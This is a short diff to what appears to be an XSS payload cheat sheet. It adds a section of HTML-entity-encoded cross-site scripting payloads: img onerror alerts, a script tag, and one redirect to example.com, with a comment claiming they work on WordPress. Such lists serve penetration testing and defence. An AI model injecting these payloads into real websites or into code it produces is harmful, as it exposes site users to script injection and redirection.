@@ -214,6 +214,16 @@ Most tools are also suitable for blind XSS attacks:
 <div onpointerout="alert(45)">MOVE HERE</div>
 <div onpointerup="alert(45)">MOVE HERE</div>
 ```
+### XSS using entity HTML
+
+```javascript
+// Works very good at Wordpress (CVE-2025-14588)
+
+&lt;img src=x onerror=alert(1)&gt;
+&lt;img src=x onerror=window.location.href="https://example.com"&gt;
+&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+```
 
 ### XSS using HTML5 tags
 
